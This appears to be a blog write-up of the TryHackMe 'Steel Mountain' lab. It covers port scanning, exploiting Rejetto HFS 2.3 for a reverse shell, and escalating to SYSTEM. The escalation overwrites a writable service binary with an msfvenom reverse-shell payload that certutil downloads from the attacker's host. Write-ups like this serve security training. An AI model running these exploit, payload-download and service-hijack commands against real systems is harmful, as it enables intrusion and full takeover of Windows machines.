---
layout: post
title: THM Steel Mountain WriteUp
date: 2024-12-27
categories:
  - TryHackMe
  - TryHackMe-Windows
tags:
  - CTF
  - TryHackMe
  - Windows
  - Overwriting-Service
  - Rejetto-HFS
  - Msfvenom
media_subpath: /assets/img/Steel
---
![Desktop View](Steel.jpeg){: w="400"  h="400" }



# Steel Mountain Skills


>**Steel Mountain** is an easy Windows machine where we will use the following skills:

-  **Port Discovery**
-  **Web Fuzzing**
-  **Web Tech's Enumeration**
- **Command Injection**
- **Generating Payload with MSFvenom** 
-  **Using Automated PrivEsc Script (winPEAS)**
-  **Overwriting Service Binary**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **80, 135, 139, 445, 3389, 5985** & port **8080**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.148.70 -oG allPorts
Nmap scan report for 10.10.148.70
Host is up, received user-set (0.095s latency).
Scanned at 2024-12-26 17:53:54 CET for 20s
Not shown: 64673 closed tcp ports (reset), 847 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
5985/tcp  open  wsman         syn-ack ttl 127
8080/tcp  open  http-proxy    syn-ack ttl 127
47001/tcp open  winrm         syn-ack ttl 127
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49155/tcp open  unknown       syn-ack ttl 127
49157/tcp open  unknown       syn-ack ttl 127
49163/tcp open  unknown       syn-ack ttl 127
49164/tcp open  unknown       syn-ack ttl 127
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49163,49164 10.10.148.70 -oN targeted
Nmap scan report for 10.10.148.70
Host is up (0.092s latency).

PORT      STATE  SERVICE            VERSION
80/tcp    open   http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp   open   msrpc              Microsoft Windows RPC
139/tcp   open   netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open   ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2024-12-26T16:57:39+00:00
|_ssl-date: 2024-12-26T16:57:44+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2024-12-25T13:55:08
|_Not valid after:  2025-06-26T13:55:08
5985/tcp  open   http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open   http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
47001/tcp open   http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open   msrpc              Microsoft Windows RPC
49153/tcp open   msrpc              Microsoft Windows RPC
49154/tcp open   msrpc              Microsoft Windows RPC
49155/tcp open   msrpc              Microsoft Windows RPC
49156/tcp closed unknown
49163/tcp open   msrpc              Microsoft Windows RPC
49164/tcp open   msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-12-26T16:57:37
|_  start_date: 2024-12-26T13:55:00
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:b3:85:cf:55:99 (unknown)
```

So we have to check the following ports & services:

- **Port 80 --> Microsoft IIS httpd 8.5**
- **Port 445 --> Microsoft Windows Server 2008 R2 - 2012**
- **Port 3389 --> RDP**
- **5985 --> **Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)**
- **8080 --> HttpFileServer httpd 2.3**

Let's start with the Microsoft IIS web server.

---
## Port 80 Enumeration

At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.148.70
http://10.10.148.70 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/8.5], IP[10.10.148.70], Microsoft-IIS[8.5]
```

Nothing found aside the IIS version: **Microsoft-IIS[8.5]**, so let's take a look inside the website, once inside ***http://10.10.148.70***, we are in front of a simple page with a logo and a photo of the employee of the moth, we can answer the first question looking in the source code:

![Desktop View](SteelMainPage.png)

We could fuzz the web, but before making that much noise, let's check the other website at port **8080**. 

## Port 8080 Enumeration

The `nmap` scan revealed that there is a web application named `HttpFileServer 2.3` so let's check.

```bash
❯ whatweb 10.10.148.70:8080
http://10.10.148.70:8080 [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.148.70], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
```

Seems right, we can see multiple times the name **HFS** & **HttpFileServer**.

Once inside of the website we can see the next main page:

![Desktop View](SteelMainPage2.png)

We are in front of a login page and we can now confirm that we are in front of a **HFS service**, i didn’t know what this service is, so i checked it with a quick search.

According to Wikipedia:

- ****HFS (HTTP File Server)*** *is a lightweight web server primarily designed for file sharing over HTTP. It allows users to share files and directories easily via a web interface without the need for extensive configuration.*

So once we know what we are facing, let’s check if there is any publicly available exploit for this specific version using `searchsploit`.

```bash
❯ searchsploit hfs 2.3
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                                             | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                                             | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                  | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                          | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                     | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                     | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                | windows/webapps/34852.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

We found multiple exploits so after checking some of them, the one i preferred was the `windows/remote/39161.py`, so let's copy it to our current directory.

```bash
❯ searchsploit -m windows/remote/39161.py
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (540)
Copied to: /home/ne4rby/Documents/CTFs/Steel/exploits/39161.py


❯ mv 39161.py exploit.py
❯ ls -l
.rwxr-xr-x root   root   2.4 KB Thu Dec 26 18:35:29 2024  exploit.py
```

In order to run the exploit, it ask us to change our IP address and port inside the script, host a `nc.exe` binary on a local server, and run it with the target URL and the target port as arguments.

![Desktop View](SteelExploit.png)

In the image above you can see three shells in the top one i settled a **listener**, in the bottom right i hosted the `nc.exe` binary and in the bottom left i ran the exploit, after two executions i get a reverse shell.

*The exploit might need to be ran more than one time to get the shell.*
## Shell as Bill

Once inside we can move forward to the current user desktop to find the flag:

```bash
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd C:\\Users\bill\Desktop
cd C:\\Users\bill\Desktop

C:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Desktop

09/27/2019  08:08 AM    <DIR>          .
09/27/2019  08:08 AM    <DIR>          ..
09/27/2019  04:42 AM                70 user.txt
               1 File(s)             70 bytes
               2 Dir(s)  44,155,359,232 bytes free

C:\Users\bill\Desktop>type user.txt
type user.txt
b04763b******************b4fd365

C:\Users\bill\Desktop>
```

So let's now enumerate and try to elevate our session.

After some time checking usual miss configurations i decided to ran `winPEASx64.exe` to see what i was missing.

```bash
C:\Temp>winPEASx64.exe

<REDACTED INFO>

�����������������������������������͹ Services Information �������������������������������������

����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    AdvancedSystemCareService9(Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
    File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
    Advanced SystemCare Service
   =================================================================================================

<REDACTED INFO>
```

And i found all the files in a `IObit` directory are owned by `Administrator`, but we can modify them as `bill`, the problem comes when there is a service running some executables of this folder, so we can try to stop the service, modify the `ASCService.exe` executable and start the service again.

Checking the service we can see the binary path `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`, so let's overwrite it and restart the service.

```bash
C:\Program Files (x86)\IObit\Advanced SystemCare>sc qc AdvancedSystemCareService9
sc qc AdvancedSystemCareService9
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        LOAD_ORDER_GROUP   : System Reserved
        TAG                : 1
        DISPLAY_NAME       : Advanced SystemCare Service 9
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

So we create a reverse shell with `msfvenom`, output the result as the name of the executable and host the reverse shell in a server.

```bash
❯ msfvenom -p windows/shell/reverse_tcp LHOST=10.11.116.52 LPORT=4443 -f exe -o ASCService.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: ASCService.exe
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

After that, we stop the `AdvancedSystemCareService9` service, then transfer the payload to the target using `certutil`.

```bash
C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Program Files (x86)\IObit\Advanced SystemCare>certutil -urlcache -split -f http://10.11.116.52/ASCService.exe
certutil -urlcache -split -f http://10.11.116.52/ASCService.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.
```

Then we set a listener with `metasploit`.

```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.116.52
LHOST => 10.11.116.52
msf6 exploit(multi/handler) > set LPORT 4443
LPORT => 4443
msf6 exploit(multi/handler) > run
```

Finally we can start the service again and we should get a elevated shell.

```bash
C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
```

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.116.52:4443 
[*] Sending stage (240 bytes) to 10.10.43.0
[*] Command shell session 2 opened (10.11.116.52:4443 -> 10.10.43.0:49260) at 2024-12-27 19:25:34 +0100


Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

After restarting the service we get a shell as `NT AUTHORITY\SYSTEM`.

We can see the root flag inside the `C:\Users\Administrator\Desktop` folder as `root.txt`.

```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314**************03a587db80
```

---
## Final Thoughts

The **Steel Mountain CTF** was a solid learning experience. It combined realistic vulnerabilities like outdated software and misconfigurations, making the process straightforward yet engaging. Each step, from exploiting HFS to privilege escalation via the service path, reinforced practical skills. Overall, a well-structured challenge that builds confidence and sharpens techniques for real-world scenarios.

![Desktop View](SteelPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

